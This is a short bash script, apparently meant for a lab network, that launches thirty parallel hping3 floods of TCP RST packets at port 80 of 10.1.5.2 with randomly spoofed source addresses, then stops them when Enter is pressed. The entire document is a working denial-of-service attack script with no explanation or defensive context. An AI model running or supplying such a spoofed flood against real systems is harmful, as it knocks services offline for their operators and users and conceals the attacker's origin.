for i in {1..30}; do
  RANDOM_IP="10.1.$((RANDOM%256)).$((RANDOM%256))"
  sudo hping3 -I eth1 -R -p 80 --flood -a $RANDOM_IP 10.1.5.2 &
done
read
sudo pkill hping3
